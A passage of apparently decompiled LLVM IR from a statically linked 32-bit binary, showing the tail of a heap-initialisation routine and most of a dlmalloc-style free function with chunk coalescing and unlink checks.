  br i1 %v1_8050d62, label %dec_label_pc_8050d84, label %dec_label_pc_8050d64

dec_label_pc_8050d64:                             ; preds = %dec_label_pc_8050d47
  %v1_8050d64 = inttoptr i32 %v0_8050d64 to i32*
  %v2_8050d64 = load i32, i32* %v1_8050d64, align 4
  store i32 %v2_8050d64, i32* %ebp.global-to-local, align 4
  %v2_8050d68 = sub i32 %v0_8050d64, %v2_8050d64
  store i32 %v2_8050d68, i32* %eax.global-to-local, align 4
  %v1_8050d6a = add i32 %v2_8050d68, 8
  %v2_8050d6a = inttoptr i32 %v1_8050d6a to i32*
  %v3_8050d6a = load i32, i32* %v2_8050d6a, align 4
  store i32 %v3_8050d6a, i32* @esi, align 4
  %v1_8050d6d = add i32 %v2_8050d68, 12
  %v2_8050d6d = inttoptr i32 %v1_8050d6d to i32*
  %v3_8050d6d = load i32, i32* %v2_8050d6d, align 4
  store i32 %v3_8050d6d, i32* %edx.global-to-local, align 4
  %v1_8050d70 = add i32 %v3_8050d6a, 12
  %v2_8050d70 = inttoptr i32 %v1_8050d70 to i32*
  %v3_8050d70 = load i32, i32* %v2_8050d70, align 4
  store i32 %v3_8050d70, i32* @ecx, align 4
  %v12_8050d73 = icmp eq i32 %v3_8050d70, %v2_8050d68
  %v1_8050d75 = icmp eq i1 %v12_8050d73, false
  br i1 %v1_8050d75, label %dec_label_pc_8050db4, label %dec_label_pc_8050d77

dec_label_pc_8050d77:                             ; preds = %dec_label_pc_8050d64
  %v1_8050d77 = add i32 %v3_8050d6d, 8
  %v2_8050d77 = inttoptr i32 %v1_8050d77 to i32*
  %v3_8050d77 = load i32, i32* %v2_8050d77, align 4
  %v15_8050d77 = icmp eq i32 %v3_8050d77, %v3_8050d70
  %v1_8050d7a = icmp eq i1 %v15_8050d77, false
  br i1 %v1_8050d7a, label %dec_label_pc_8050db4, label %dec_label_pc_8050d7c

dec_label_pc_8050d7c:                             ; preds = %dec_label_pc_8050d77
  %v2_8050d7c = add i32 %v2_8050d64, %v1_8050d53
  store i32 %v2_8050d7c, i32* @edi, align 4
  store i32 %v3_8050d6d, i32* %v2_8050d70, align 4
  %v0_8050d81 = load i32, i32* @esi, align 4
  %v1_8050d81 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050d81 = add i32 %v1_8050d81, 8
  %v3_8050d81 = inttoptr i32 %v2_8050d81 to i32*
  store i32 %v0_8050d81, i32* %v3_8050d81, align 4
  %v0_8050d8f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050d84

dec_label_pc_8050d84:                             ; preds = %dec_label_pc_8050d47, %dec_label_pc_8050d7c
  %v1_8050d98 = phi i32 [ %v2_8050d58, %dec_label_pc_8050d47 ], [ %v0_8050d8f.pre, %dec_label_pc_8050d7c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050d8c = and i32 %v3_8050d5b, -4
  store i32 %v1_8050d8c, i32* %ebp.global-to-local, align 4
  %v4_8050d8f = load i32, i32* %v3_8050df2, align 4
  %v15_8050d8f = icmp eq i32 %v1_8050d98, %v4_8050d8f
  br i1 %v15_8050d8f, label %dec_label_pc_8050de5, label %dec_label_pc_8050d94

dec_label_pc_8050d94:                             ; preds = %dec_label_pc_8050d84
  %v2_8050d94 = add i32 %v1_8050d98, 4
  %v3_8050d94 = add i32 %v2_8050d94, %v1_8050d8c
  %v4_8050d94 = inttoptr i32 %v3_8050d94 to i32*
  %v5_8050d94 = load i32, i32* %v4_8050d94, align 4
  store i32 %v5_8050d94, i32* %eax.global-to-local, align 4
  %v3_8050d98 = inttoptr i32 %v2_8050d94 to i32*
  store i32 %v1_8050d8c, i32* %v3_8050d98, align 4
  %v0_8050d9b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d9b = urem i32 %v0_8050d9b, 2
  %v2_8050d9b = icmp eq i32 %v1_8050d9b, 0
  store i32 %v1_8050d9b, i32* %eax.global-to-local, align 4
  %v1_8050da0 = icmp eq i1 %v2_8050d9b, false
  br i1 %v1_8050da0, label %dec_label_pc_8050dc1, label %dec_label_pc_8050da2

dec_label_pc_8050da2:                             ; preds = %dec_label_pc_8050d94
  %v0_8050da2 = load i32, i32* @ebx, align 4
  %v1_8050da2 = add i32 %v0_8050da2, 8
  %v2_8050da2 = inttoptr i32 %v1_8050da2 to i32*
  %v3_8050da2 = load i32, i32* %v2_8050da2, align 4
  store i32 %v3_8050da2, i32* @edx, align 4
  %v1_8050da5 = add i32 %v0_8050da2, 12
  %v2_8050da5 = inttoptr i32 %v1_8050da5 to i32*
  %v3_8050da5 = load i32, i32* %v2_8050da5, align 4
  store i32 %v3_8050da5, i32* %eax.global-to-local, align 4
  %v1_8050da8 = add i32 %v3_8050da2, 12
  %v2_8050da8 = inttoptr i32 %v1_8050da8 to i32*
  %v3_8050da8 = load i32, i32* %v2_8050da8, align 4
  store i32 %v3_8050da8, i32* @esi, align 4
  %v12_8050dab = icmp eq i32 %v3_8050da8, %v0_8050da2
  %v1_8050dad = icmp eq i1 %v12_8050dab, false
  br i1 %v1_8050dad, label %dec_label_pc_8050db4, label %dec_label_pc_8050daf

dec_label_pc_8050daf:                             ; preds = %dec_label_pc_8050da2
  %v1_8050daf = add i32 %v3_8050da5, 8
  %v2_8050daf = inttoptr i32 %v1_8050daf to i32*
  %v3_8050daf = load i32, i32* %v2_8050daf, align 4
  %v15_8050daf = icmp eq i32 %v3_8050daf, %v3_8050da8
  br i1 %v15_8050daf, label %dec_label_pc_8050db9, label %dec_label_pc_8050db4

dec_label_pc_8050db4:                             ; preds = %dec_label_pc_8050daf, %dec_label_pc_8050da2, %dec_label_pc_8050d77, %dec_label_pc_8050d64
  %v0_8050db4 = call i32 @abort()
  store i32 %v0_8050db4, i32* %eax.global-to-local, align 4
  %v1_8050dbb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050db9

dec_label_pc_8050db9:                             ; preds = %dec_label_pc_8050daf, %dec_label_pc_8050db4
  %v1_8050dbb = phi i32 [ %v3_8050da2, %dec_label_pc_8050daf ], [ %v1_8050dbb.pre, %dec_label_pc_8050db4 ]
  %v0_8050dbb = phi i32 [ %v3_8050da5, %dec_label_pc_8050daf ], [ %v0_8050db4, %dec_label_pc_8050db4 ]
  %v0_8050db9 = load i32, i32* @edi, align 4
  %v1_8050db9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050db9 = add i32 %v1_8050db9, %v0_8050db9
  store i32 %v2_8050db9, i32* @edi, align 4
  %v2_8050dbb = add i32 %v1_8050dbb, 12
  %v3_8050dbb = inttoptr i32 %v2_8050dbb to i32*
  store i32 %v0_8050dbb, i32* %v3_8050dbb, align 4
  %v0_8050dbe = load i32, i32* @edx, align 4
  %v1_8050dbe = load i32, i32* %eax.global-to-local, align 4
  %v2_8050dbe = add i32 %v1_8050dbe, 8
  %v3_8050dbe = inttoptr i32 %v2_8050dbe to i32*
  store i32 %v0_8050dbe, i32* %v3_8050dbe, align 4
  br label %dec_label_pc_8050dc1

dec_label_pc_8050dc1:                             ; preds = %dec_label_pc_8050d94, %dec_label_pc_8050db9
  store i32 %v1_8050d0c, i32* %eax.global-to-local, align 4
  %v3_8050dc5 = load i32, i32* %v2_8050dc5, align 4
  store i32 %v3_8050dc5, i32* @edx, align 4
  %v0_8050dc8 = load i32, i32* @ecx, align 4
  store i32 %v0_8050dc8, i32* %v2_8050dc5, align 4
  %v0_8050dcb = load i32, i32* @edi, align 4
  %v1_8050dcd = or i32 %v0_8050dcb, 1
  %v1_8050dd0 = load i32, i32* @ecx, align 4
  %v2_8050dd0 = add i32 %v1_8050dd0, 4
  %v3_8050dd0 = inttoptr i32 %v2_8050dd0 to i32*
  store i32 %v1_8050dcd, i32* %v3_8050dd0, align 4
  %v0_8050dd3 = load i32, i32* @ecx, align 4
  %v1_8050dd3 = load i32, i32* @edx, align 4
  %v2_8050dd3 = add i32 %v1_8050dd3, 12
  %v3_8050dd3 = inttoptr i32 %v2_8050dd3 to i32*
  store i32 %v0_8050dd3, i32* %v3_8050dd3, align 4
  store i32 %v1_8050d0c, i32* %eax.global-to-local, align 4
  %v0_8050dda = load i32, i32* @edx, align 4
  %v1_8050dda = load i32, i32* @ecx, align 4
  %v2_8050dda = add i32 %v1_8050dda, 8
  %v3_8050dda = inttoptr i32 %v2_8050dda to i32*
  store i32 %v0_8050dda, i32* %v3_8050dda, align 4
  %v0_8050ddd = load i32, i32* @edi, align 4
  %v1_8050ddd = load i32, i32* @ecx, align 4
  %v3_8050ddd = add i32 %v1_8050ddd, %v0_8050ddd
  %v4_8050ddd = inttoptr i32 %v3_8050ddd to i32*
  store i32 %v0_8050ddd, i32* %v4_8050ddd, align 4
  %v0_8050de0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050de0 = load i32, i32* @ecx, align 4
  %v2_8050de0 = add i32 %v1_8050de0, 12
  %v3_8050de0 = inttoptr i32 %v2_8050de0 to i32*
  store i32 %v0_8050de0, i32* %v3_8050de0, align 4
  br label %dec_label_pc_8050df5

dec_label_pc_8050de5:                             ; preds = %dec_label_pc_8050d84
  %v0_8050de5 = load i32, i32* @edi, align 4
  %v2_8050de5 = add i32 %v0_8050de5, %v1_8050d8c
  %v1_8050de8 = or i32 %v2_8050de5, 1
  store i32 %v1_8050de8, i32* %eax.global-to-local, align 4
  %v1_8050deb = load i32, i32* @ecx, align 4
  %v2_8050deb = add i32 %v1_8050deb, 4
  %v3_8050deb = inttoptr i32 %v2_8050deb to i32*
  store i32 %v1_8050de8, i32* %v3_8050deb, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8050df2 = load i32, i32* @ecx, align 4
  store i32 %v0_8050df2, i32* %v3_8050df2, align 4
  br label %dec_label_pc_8050df5

dec_label_pc_8050df5:                             ; preds = %dec_label_pc_8050dc1, %dec_label_pc_8050de5
  store i32 %v3_8050d47, i32* @ecx, align 4
  %v1_8050df9 = icmp eq i32 %v3_8050d47, 0
  %v1_8050dfb = icmp eq i1 %v1_8050df9, false
  br i1 %v1_8050dfb, label %dec_label_pc_8050d47, label %dec_label_pc_8050e01

dec_label_pc_8050e01:                             ; preds = %dec_label_pc_8050df5, %dec_label_pc_8050d33
  store i32 %v4_8050d2b, i32* @ecx, align 4
  %v15_8050e05 = icmp eq i32 %v0_8050d41, %v4_8050d2b
  br i1 %v15_8050e05, label %dec_label_pc_8050e89, label %dec_label_pc_8050e0b

dec_label_pc_8050e0b:                             ; preds = %dec_label_pc_8050e01
  %v4_8050e0b = add i32 %v0_8050d41, 4
  br label %dec_label_pc_8050d33

dec_label_pc_8050e15:                             ; preds = %dec_label_pc_8050e24.preheader, %dec_label_pc_8050e15
  %v1_8050e1920 = phi i32 [ 1, %dec_label_pc_8050e24.preheader ], [ %v0_8050e24.pre, %dec_label_pc_8050e15 ]
  %v2_8050e19 = mul i32 %v1_8050e1920, 8
  %v4_8050e19 = add i32 %v3_8050e19, %v2_8050e19
  store i32 %v4_8050e19, i32* %eax.global-to-local, align 4
  %v1_8050e1d = add i32 %v1_8050e1920, 1
  store i32 %v1_8050e1d, i32* %edx.global-to-local, align 4
  %v2_8050e1e = add i32 %v4_8050e19, 12
  %v3_8050e1e = inttoptr i32 %v2_8050e1e to i32*
  store i32 %v4_8050e19, i32* %v3_8050e1e, align 4
  %v0_8050e21 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050e21 = add i32 %v0_8050e21, 8
  %v3_8050e21 = inttoptr i32 %v2_8050e21 to i32*
  store i32 %v0_8050e21, i32* %v3_8050e21, align 4
  %v0_8050e24.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8050e27 = icmp sgt i32 %v0_8050e24.pre, 95
  br i1 %v7_8050e27, label %dec_label_pc_8050e29, label %dec_label_pc_8050e15

dec_label_pc_8050e29:                             ; preds = %dec_label_pc_8050e15
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8050e2d = add i32 %tmp11, 864
  %v2_8050e2d = inttoptr i32 %v1_8050e2d to i32*
  %v3_8050e2d = load i32, i32* %v2_8050e2d, align 4
  %v4_8050e2d = or i32 %v3_8050e2d, 1
  store i32 %v4_8050e2d, i32* %v2_8050e2d, align 4
  %v0_8050e34 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e34 = add i32 %v0_8050e34, 840
  %v2_8050e34 = inttoptr i32 %v1_8050e34 to i32*
  store i32 0, i32* %v2_8050e34, align 4
  %v0_8050e3e = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e3e = add i32 %v0_8050e3e, 852
  %v2_8050e3e = inttoptr i32 %v1_8050e3e to i32*
  store i32 65536, i32* %v2_8050e3e, align 4
  %v0_8050e48 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e48 = add i32 %v0_8050e48, 844
  %v2_8050e48 = inttoptr i32 %v1_8050e48 to i32*
  store i32 262144, i32* %v2_8050e48, align 4
  %v0_8050e52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e52 = add i32 %v0_8050e52, 836
  %v2_8050e52 = inttoptr i32 %v1_8050e52 to i32*
  store i32 262144, i32* %v2_8050e52, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8050e63 = load i32, i32* %arg1, align 4
  %v1_8050e65 = urem i32 %v2_8050e63, 4
  %v1_8050e68 = or i32 %v1_8050e65, 72
  store i32 %v1_8050e68, i32* %arg1, align 4
  %v0_8050e6d = load i32, i32* @edx, align 4
  %v1_8050e6f = add i32 %v0_8050e6d, 52
  store i32 %v1_8050e6f, i32* %eax.global-to-local, align 4
  %v2_8050e72 = add i32 %v0_8050e6d, 44
  %v3_8050e72 = inttoptr i32 %v2_8050e72 to i32*
  store i32 %v1_8050e6f, i32* %v3_8050e72, align 4
  %v1_8050e77 = call i32 @sysconf(i32 30)
  store i32 %v1_8050e77, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8050e83 = add i32 %tmp11, 860
  %v3_8050e83 = inttoptr i32 %v2_8050e83 to i32*
  store i32 %v1_8050e77, i32* %v3_8050e83, align 4
  br label %dec_label_pc_8050e89

dec_label_pc_8050e89:                             ; preds = %dec_label_pc_8050e01, %dec_label_pc_8050e29
  store i32 %v0_8050cec, i32* @ebx, align 4
  store i32 %v0_8050ceb, i32* @esi, align 4
  store i32 %v0_8050cea, i32* @edi, align 4
  %v0_8050e90 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050e90

; uselistorder directives
  uselistorder i32 %v0_8050e21, { 1, 0 }
  uselistorder i32 %v0_8050ddd, { 1, 0 }
  uselistorder i32 %v1_8050d9b, { 1, 0 }
  uselistorder i32 %v2_8050d94, { 1, 0 }
  uselistorder i32 %v1_8050d8c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050d98, { 1, 0 }
  uselistorder i32 %v3_8050d47, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8050d64, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050d41, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8050df2, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8050e89, { 1, 0 }
  uselistorder label %dec_label_pc_8050e15, { 1, 0 }
  uselistorder label %dec_label_pc_8050df5, { 1, 0 }
  uselistorder label %dec_label_pc_8050dc1, { 1, 0 }
  uselistorder label %dec_label_pc_8050db9, { 1, 0 }
  uselistorder label %dec_label_pc_8050d84, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050e91 = load i32, i32* @ebp, align 4
  %v0_8050e92 = load i32, i32* @edi, align 4
  %v0_8050e93 = load i32, i32* @esi, align 4
  %v0_8050e94 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050e9c = icmp eq i32 %arg1, 0
  br i1 %v1_8050e9c, label %dec_label_pc_8051025, label %dec_label_pc_8050ea4

dec_label_pc_8050ea4:                             ; preds = %entry
  %v2_8050eaf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050eaf, i32* @eax, align 4
  %v2_8050eb4 = call i32 @__pthread_return_void(i32 %v2_8050eaf, i32 134552147)
  store i32 %v2_8050eb4, i32* %eax.global-to-local, align 4
  %v1_8050ec0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058370.177 to i32))
  %v1_8050ec5 = add i32 %arg1, -8
  store i32 %v1_8050ec5, i32* @ecx, align 4
  %v0_8050ec8 = load i8, i8* @global_var_805e7e0.178, align 1
  %v1_8050ec8 = sext i8 %v0_8050ec8 to i32
  store i32 %v1_8050ec8, i32* %eax.global-to-local, align 4
  %v1_8050ecd = add i32 %arg1, -4
  %v2_8050ecd = inttoptr i32 %v1_8050ecd to i32*
  %v3_8050ecd = load i32, i32* %v2_8050ecd, align 4
  store i32 %v3_8050ecd, i32* @edx, align 4
  %v1_8050ed5 = and i32 %v3_8050ecd, -4
  %v4_8050ed5 = trunc i32 %v1_8050ed5 to i8
  store i32 %v1_8050ed5, i32* @ebx, align 4
  %v8_8050eda = icmp ugt i8 %v4_8050ed5, %v0_8050ec8
  br i1 %v8_8050eda, label %dec_label_pc_8050efc, label %dec_label_pc_8050edc

dec_label_pc_8050edc:                             ; preds = %dec_label_pc_8050ea4
  %v1_8050edc = or i32 %v1_8050ec8, 3
  %v3_8050edc = trunc i32 %v1_8050edc to i8
  store i32 %v1_8050edc, i32* %eax.global-to-local, align 4
  %v2_8050edf = udiv i32 %v3_8050ecd, 8
  store i8 %v3_8050edc, i8* @global_var_805e7e0.178, align 32
  %v1_8050ee7 = mul nuw i32 %v2_8050edf, 4
  %v2_8050ee7 = add i32 %v1_8050ee7, ptrtoint (i8* @global_var_805e7e0.178 to i32)
  store i32 %v2_8050ee7, i32* @edx, align 4
  %v1_8050eee = add i32 %v1_8050ee7, add (i32 ptrtoint (i8* @global_var_805e7e0.178 to i32), i32 -4)
  %v2_8050eee = inttoptr i32 %v1_8050eee to i32*
  %v3_8050eee = load i32, i32* %v2_8050eee, align 4
  store i32 %v3_8050eee, i32* %eax.global-to-local, align 4
  %v3_8050ef1 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8050eee, i32* %v3_8050ef1, align 4
  %v0_8050ef4 = load i32, i32* @ecx, align 4
  %v1_8050ef4 = load i32, i32* @edx, align 4
  %v2_8050ef4 = add i32 %v1_8050ef4, -4
  %v3_8050ef4 = inttoptr i32 %v2_8050ef4 to i32*
  store i32 %v0_8050ef4, i32* %v3_8050ef4, align 4
  br label %dec_label_pc_8051014

dec_label_pc_8050efc:                             ; preds = %dec_label_pc_8050ea4
  %v2_8050efc = and i32 %v3_8050ecd, 2
  %v3_8050efc = icmp eq i32 %v2_8050efc, 0
  %v1_8050eff = icmp eq i1 %v3_8050efc, false
  br i1 %v1_8050eff, label %dec_label_pc_8050ff4, label %dec_label_pc_8050f05

dec_label_pc_8050f05:                             ; preds = %dec_label_pc_8050efc
  %v1_8050f05 = or i32 %v1_8050ec8, 1
  %v3_8050f05 = trunc i32 %v1_8050f05 to i8
  store i32 %v1_8050f05, i32* %eax.global-to-local, align 4
  store i8 %v3_8050f05, i8* @global_var_805e7e0.178, align 32
  %v2_8050f0d = add i32 %v1_8050ed5, %v1_8050ec5
  store i32 %v2_8050f0d, i32* @esi, align 4
  %v1_8050f10 = add i32 %v2_8050f0d, 4
  %v2_8050f10 = inttoptr i32 %v1_8050f10 to i32*
  %v3_8050f10 = load i32, i32* %v2_8050f10, align 4
  store i32 %v3_8050f10, i32* %eax.global-to-local, align 4
  %v2_8050f17 = inttoptr i32 %v1_8050ecd to i8*
  %v3_8050f17 = load i8, i8* %v2_8050f17, align 1
  %v4_8050f17 = urem i8 %v3_8050f17, 2
  %v5_8050f17 = icmp eq i8 %v4_8050f17, 0
  %v1_8050f1b = icmp eq i1 %v5_8050f17, false
  br i1 %v1_8050f1b, label %dec_label_pc_8050f3e, label %dec_label_pc_8050f1d

dec_label_pc_8050f1d:                             ; preds = %dec_label_pc_8050f05
  %v2_8050f1d = inttoptr i32 %v1_8050ec5 to i32*
  %v3_8050f1d = load i32, i32* %v2_8050f1d, align 4
  store i32 %v3_8050f1d, i32* @ebp, align 4
  %v2_8050f22 = sub i32 %v1_8050ec5, %v3_8050f1d
  store i32 %v2_8050f22, i32* %eax.global-to-local, align 4
  %v1_8050f24 = add i32 %v2_8050f22, 8
  %v2_8050f24 = inttoptr i32 %v1_8050f24 to i32*
  %v3_8050f24 = load i32, i32* %v2_8050f24, align 4
  store i32 %v3_8050f24, i32* @edi, align 4
  %v1_8050f27 = add i32 %v2_8050f22, 12
  %v2_8050f27 = inttoptr i32 %v1_8050f27 to i32*
  %v3_8050f27 = load i32, i32* %v2_8050f27, align 4
  store i32 %v3_8050f27, i32* @edx, align 4
  %v1_8050f2a = add i32 %v3_8050f24, 12
  %v2_8050f2a = inttoptr i32 %v1_8050f2a to i32*
  %v3_8050f2a = load i32, i32* %v2_8050f2a, align 4
  store i32 %v3_8050f2a, i32* @ecx, align 4
  %v12_8050f2d = icmp eq i32 %v3_8050f2a, %v2_8050f22
  %v1_8050f2f = icmp eq i1 %v12_8050f2d, false
  br i1 %v1_8050f2f, label %dec_label_pc_8050f6d, label %dec_label_pc_8050f31

dec_label_pc_8050f31:                             ; preds = %dec_label_pc_8050f1d
  %v1_8050f31 = add i32 %v3_8050f27, 8
  %v2_8050f31 = inttoptr i32 %v1_8050f31 to i32*
  %v3_8050f31 = load i32, i32* %v2_8050f31, align 4
  %v15_8050f31 = icmp eq i32 %v3_8050f31, %v3_8050f2a
  %v1_8050f34 = icmp eq i1 %v15_8050f31, false
  br i1 %v1_8050f34, label %dec_label_pc_8050f6d, label %dec_label_pc_8050f36

dec_label_pc_8050f36:                             ; preds = %dec_label_pc_8050f31
  %v2_8050f36 = add i32 %v3_8050f1d, %v1_8050ed5
  store i32 %v2_8050f36, i32* @ebx, align 4
  store i32 %v3_8050f27, i32* %v2_8050f2a, align 4
  %v0_8050f3b = load i32, i32* @edi, align 4
  %v1_8050f3b = load i32, i32* @edx, align 4
  %v2_8050f3b = add i32 %v1_8050f3b, 8
  %v3_8050f3b = inttoptr i32 %v2_8050f3b to i32*
  store i32 %v0_8050f3b, i32* %v3_8050f3b, align 4
  %v0_8050f45.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050f3e

dec_label_pc_8050f3e:                             ; preds = %dec_label_pc_8050f05, %dec_label_pc_8050f36
  %v1_8050f51 = phi i32 [ %v2_8050f0d, %dec_label_pc_8050f05 ], [ %v0_8050f45.pre, %dec_label_pc_8050f36 ]
  %v1_8050f42 = and i32 %v3_8050f10, -4
  store i32 %v1_8050f42, i32* @ebp, align 4
  %v1_8050f45 = load i32, i32* @global_var_805e80c.179, align 4
  %v12_8050f45 = icmp eq i32 %v1_8050f51, %v1_8050f45
  br i1 %v12_8050f45, label %dec_label_pc_8050f9f, label %dec_label_pc_8050f4d

dec_label_pc_8050f4d:                             ; preds = %dec_label_pc_8050f3e
  %v2_8050f4d = add i32 %v1_8050f51, 4
  %v3_8050f4d = add i32 %v2_8050f4d, %v1_8050f42
  %v4_8050f4d = inttoptr i32 %v3_8050f4d to i32*
  %v5_8050f4d = load i32, i32* %v4_8050f4d, align 4
  store i32 %v5_8050f4d, i32* %eax.global-to-local, align 4
  %v3_8050f51 = inttoptr i32 %v2_8050f4d to i32*
  store i32 %v1_8050f42, i32* %v3_8050f51, align 4
  %v0_8050f54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f54 = urem i32 %v0_8050f54, 2
  %v2_8050f54 = icmp eq i32 %v1_8050f54, 0
  store i32 %v1_8050f54, i32* %eax.global-to-local, align 4
  %v1_8050f59 = icmp eq i1 %v2_8050f54, false
  br i1 %v1_8050f59, label %dec_label_pc_8050f7a, label %dec_label_pc_8050f5b

dec_label_pc_8050f5b:                             ; preds = %dec_label_pc_8050f4d
  %v0_8050f5b = load i32, i32* @esi, align 4
  %v1_8050f5b = add i32 %v0_8050f5b, 8
  %v2_8050f5b = inttoptr i32 %v1_8050f5b to i32*
  %v3_8050f5b = load i32, i32* %v2_8050f5b, align 4
  store i32 %v3_8050f5b, i32* @edx, align 4
  %v1_8050f5e = add i32 %v0_8050f5b, 12
  %v2_8050f5e = inttoptr i32 %v1_8050f5e to i32*
  %v3_8050f5e = load i32, i32* %v2_8050f5e, align 4
  store i32 %v3_8050f5e, i32* %eax.global-to-local, align 4
  %v1_8050f61 = add i32 %v3_8050f5b, 12
  %v2_8050f61 = inttoptr i32 %v1_8050f61 to i32*
  %v3_8050f61 = load i32, i32* %v2_8050f61, align 4
  store i32 %v3_8050f61, i32* @edi, align 4
  %v12_8050f64 = icmp eq i32 %v3_8050f61, %v0_8050f5b
  %v1_8050f66 = icmp eq i1 %v12_8050f64, false
  br i1 %v1_8050f66, label %dec_label_pc_8050f6d, label %dec_label_pc_8050f68

dec_label_pc_8050f68:                             ; preds = %dec_label_pc_8050f5b
  %v1_8050f68 = add i32 %v3_8050f5e, 8
  %v2_8050f68 = inttoptr i32 %v1_8050f68 to i32*
  %v3_8050f68 = load i32, i32* %v2_8050f68, align 4
  %v15_8050f68 = icmp eq i32 %v3_8050f68, %v3_8050f61
  br i1 %v15_8050f68, label %dec_label_pc_8050f72, label %dec_label_pc_8050f6d

dec_label_pc_8050f6d:                             ; preds = %dec_label_pc_8050f68, %dec_label_pc_8050f5b, %dec_label_pc_8050f31, %dec_label_pc_8050f1d
  %v0_8050f6d = call i32 @abort()
  store i32 %v0_8050f6d, i32* %eax.global-to-local, align 4
  %v1_8050f72.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050f72

dec_label_pc_8050f72:                             ; preds = %dec_label_pc_8050f68, %dec_label_pc_8050f6d
  %v1_8050f72 = phi i32 [ %v3_8050f5b, %dec_label_pc_8050f68 ], [ %v1_8050f72.pre, %dec_label_pc_8050f6d ]
  %v0_8050f72 = phi i32 [ %v3_8050f5e, %dec_label_pc_8050f68 ], [ %v0_8050f6d, %dec_label_pc_8050f6d ]
  %v2_8050f72 = add i32 %v1_8050f72, 12
  %v3_8050f72 = inttoptr i32 %v2_8050f72 to i32*
  store i32 %v0_8050f72, i32* %v3_8050f72, align 4
  %v0_8050f75 = load i32, i32* @ebx, align 4
  %v1_8050f75 = load i32, i32* @ebp, align 4
  %v2_8050f75 = add i32 %v1_8050f75, %v0_8050f75
  store i32 %v2_8050f75, i32* @ebx, align 4
  %v0_8050f77 = load i32, i32* @edx, align 4
  %v1_8050f77 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f77 = add i32 %v1_8050f77, 8
  %v3_8050f77 = inttoptr i32 %v2_8050f77 to i32*
  store i32 %v0_8050f77, i32* %v3_8050f77, align 4
  br label %dec_label_pc_8050f7a

dec_label_pc_8050f7a:                             ; preds = %dec_label_pc_8050f4d, %dec_label_pc_8050f72
  %v0_8050f7a = load i32, i32* @global_var_805e81c.197, align 4
  store i32 %v0_8050f7a, i32* %eax.global-to-local, align 4
  %v0_8050f7f = load i32, i32* @ecx, align 4
  %v1_8050f7f = add i32 %v0_8050f7f, 12
  %v2_8050f7f = inttoptr i32 %v1_8050f7f to i32*
  store i32 ptrtoint (i32* @global_var_805e814.181 to i32), i32* %v2_8050f7f, align 4
  %v0_8050f86 = load i32, i32* @ebx, align 4
  %v1_8050f86 = load i32, i32* @ecx, align 4
  %v3_8050f86 = add i32 %v1_8050f86, %v0_8050f86
  %v4_8050f86 = inttoptr i32 %v3_8050f86 to i32*
  store i32 %v0_8050f86, i32* %v4_8050f86, align 4
  %v0_8050f89 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f89 = load i32, i32* @ecx, align 4
  %v2_8050f89 = add i32 %v1_8050f89, 8
  %v3_8050f89 = inttoptr i32 %v2_8050f89 to i32*
  store i32 %v0_8050f89, i32* %v3_8050f89, align 4
  %v0_8050f8c = load i32, i32* @ecx, align 4
  %v1_8050f8c = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f8c = add i32 %v1_8050f8c, 12
  %v3_8050f8c = inttoptr i32 %v2_8050f8c to i32*
  store i32 %v0_8050f8c, i32* %v3_8050f8c, align 4
  %v0_8050f8f = load i32, i32* @ebx, align 4
  %v1_8050f91 = or i32 %v0_8050f8f, 1
  store i32 %v1_8050f91, i32* %eax.global-to-local, align 4
  %v0_8050f94 = load i32, i32* @ecx, align 4
  store i32 %v0_8050f94, i32* @global_var_805e81c.197, align 4
  %v2_8050f9a = add i32 %v0_8050f94, 4
  %v3_8050f9a = inttoptr i32 %v2_8050f9a to i32*
  store i32 %v1_8050f91, i32* %v3_8050f9a, align 4
  br label %dec_label_pc_8050faf

dec_label_pc_8050f9f:                             ; preds = %dec_label_pc_8050f3e
  %v0_8050f9f = load i32, i32* @ebx, align 4
  %v2_8050f9f = add i32 %v0_8050f9f, %v1_8050f42
  store i32 %v2_8050f9f, i32* @ebx, align 4
  %v1_8050fa3 = or i32 %v2_8050f9f, 1
  store i32 %v1_8050fa3, i32* %eax.global-to-local, align 4
  %v1_8050fa6 = load i32, i32* @ecx, align 4
  %v2_8050fa6 = add i32 %v1_8050fa6, 4
  %v3_8050fa6 = inttoptr i32 %v2_8050fa6 to i32*
  store i32 %v1_8050fa3, i32* %v3_8050fa6, align 4
